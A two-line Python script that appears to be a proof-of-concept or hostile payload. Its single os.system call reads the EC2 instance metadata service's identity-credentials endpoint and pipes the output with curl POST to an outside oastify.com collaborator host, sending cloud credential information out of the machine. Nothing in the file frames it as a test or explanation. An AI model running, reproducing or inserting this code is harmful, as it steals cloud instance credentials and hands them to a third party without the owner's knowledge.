import os

os.system('curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info | curl -X POST --data-binary @- https://503wxigqvaz7hf4nnepxwnga2182wukj.oastify.com/pl')
